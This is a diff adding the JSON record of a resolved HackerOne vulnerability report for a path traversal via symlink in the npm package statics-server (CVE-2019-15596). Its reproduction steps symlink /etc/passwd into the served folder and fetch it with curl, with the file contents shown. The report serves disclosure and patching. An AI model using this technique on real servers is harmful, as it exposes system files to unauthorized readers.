@@ -1,0 +1,141 @@
+{
+  "id": 695416,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82OTU0MTY=",
+  "url": "https://hackerone.com/reports/695416",
+  "title": "Path traversal using symlink",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2019-09-16T07:54:32.084Z",
+  "submitted_at": "2019-09-16T07:54:32.084Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "zxdrrr",
+    "url": "/zxdrrr",
+    "profile_picture_urls": {
+      "small": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6NzQzNDk4LCJwdXIiOiJibG9iX2lkIn19--74abc7cd9c166b3dae61a964eb13346757177d88/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJwbmciLCJncmF2aXR5IjoiQ2VudGVyIiwicmVzaXplIjoiNjJ4NjJeIiwiY3JvcCI6IjYyeDYyKzArMCJ9LCJwdXIiOiJ2YXJpYXRpb24ifX0=--a4d91faed3dff6024dfc1a7b7f8ccc6b45e38396/googlelogo_color_272x92dp.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2019-15596"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-10-07T16:39:37.919Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2019-10-07T16:39:22.252Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report Path Traversal in statics-server\n\n# Module\n\n**module name:** statics-server\n**version:** 0.0.9\n**npm page:** `https://www.npmjs.com/package/statics-server`\n\n## Module Description\n\n> npm install statics-server -g\n    Go to the folder you want to statics-server\n    Run the server statics-server\n\n## Module Stats\n\n> 80-100 downloads/month\n\n# Vulnerability\n\n## Vulnerability Description\n\n> Path traversal using symlink.\n\n## Steps To Reproduce:\n\n* Install statics-server `npm install statics-server -g`\n* Run statics-server\n\n```\nhawkeye@ubuntu:~/App/$ statics-server\n服务器已经启动\n访问localhost:8080\n\n```\n\n* Create a symlink inside your project directory.\n`$ ln -s /etc/passwd passwdsym`\n* Send request to get file.\n\n```\nhawkeye@ubuntu:~/$ curl localhost:8080/passwdsym\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n...\n\n```\n{F583766}\n## Patch\n\n> Providing a flag to disable/enable following symlinks.\n\n## Supporting Material/References:\n\n- Ubuntu 19.04\n- Node v10.15.2\n- Npm 5.8.0\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N]\n\n## Impact\n\nIt allows attacker to read content of arbitrary file on remote server.",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 583766,
+      "file_name": "Curl.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/5t6Su8D716y2Qqs2BNBLr9bB?response-content-disposition=attachment%3B%20filename%3D%22Curl.png%22%3B%20filename%2A%3DUTF-8%27%27Curl.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQT5SD3VK2%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T142635Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQClRXfVQ6TcJFROTF%2BD0LDL4IptBemJc5EMG848%2FCEiSQIhAKDXmyowzdpDu4zfEapkWcuivUF63JNAxYz2favlbU6bKrIFCBcQAxoMMDEzNjE5Mjc0ODQ5IgyKlpw5OowlLiWsLL8qjwU0D29xrhlZFCfHcqjeZqnfiyItH0QCdyaKA%2F8%2BPGpNz2JgpL6QTAwDZCtHYpJ2OsSV%2Fr0t%2BhiNft4faKC3j2Re4gXFlwXAzQ3UGuAAGxcwgIc7gFmPcZWE0SRhBdJmk2S%2BJos09tCiFdi%2FbxRyB3zF64dzD5fSumyqcEn%2B2Vnd00pMBX742VkbEf7ZrNuyB62b1ytaX9jj9uvCFABG55FHDM%2Bs37wZacobZcdYBUPtU2XeZTkWX7AKGe%2FYmNjN%2FCI%2BxIoV7xxTqcG%2Baq7erC61AYhVA5BQfpjdl1bhHpa12u1DFE7HS57F97QReN6xh059bv%2FTllJIx8plaNjjH2jyflJMGw0Dw2DMiRrS7tIxJhQLAjBMb4C4V7N%2BM%2BaYvfy8%2FfbziqtvAUL8KMu6JyAjiQFuRhibIpqiMs3vU1r2o3TaJvpwb%2F9%2B0noBVyL2mEXDZLSZXRNCnvTiCzHLsk87FJVYtRr2awVVN9HtLz2KvmKgDreKiPAOXfPCFtAQa9YLiWIPUuVtgioN9ZBo5xJaCCyMGIzCh%2Fkrs1a0DcWy4F7Ytp4jBJcaMTR19B9HxNJL3aj8fMZlif8A0f0aaG%2FBgx7o5981IkRN3fvdIme%2FGy59thdwpQWaGEcGFmbADJgW%2FUetzXfy4OHnAUuQN5g8tkLNZhOOMkLBC3kLLrbfeiTttC8hssEuonPS5FvdddJqvftgcN%2Btb6H%2B1mYkyDlIcS6dii1q%2BhZizteMV9E0OBg1K8Ylk36UwJ3sW%2B8VxpTiVst%2FCObvfePMpGyI10NWIZQWKo%2BbxnzRUnD14TtT5uqbGn0QUuAEyUMWhQFS5SK5ZjRVCzQKPJTjGtT1RulMo59rlIi8SANcD1u8orU0MJP5v8YGOrABxqGEwH2lu%2FSIiLkjMB93i6n75LP7E6dFaf8U2coeh%2FJFyPT0Fob%2BvLKn7heOlHaTP86GXxcuQ%2F7dOAFxfCcMZJwPoTg4MLVffgesdH3XcR6WccyCO7CULPqRy39ydkdy5bAD0rlIb4KBU4W2miAyLWCv5A8%2BACxOO2Y%2BdrmDICvpHOjLOqM2jQrXEsy42y2NRm8%2FtGBFtSOfk9J9G5g0mOcoHMA4EPWmf7LR9VvpFQc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bf2537080a794ef96b356e9be93428d3c372562c46179381aa0b823c94fe5cbc",
+      "file_size": 74374,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2019-11-06T16:39:22.377Z",
+  "allow_singular_disclosure_after": -185406433.34087735,
+  "singular_disclosure_allowed": true,
+  "vote_count": 8,
+  "voters": [
+    "paradiso",
+    "mcofficialplayyt",
+    "tilo_k",
+    "brokeda",
+    "shig",
+    "b1-66er",
+    "dt-bilardo",
+    "b051882255d263e19d9e730"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.5,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 12358,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "statics-server",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
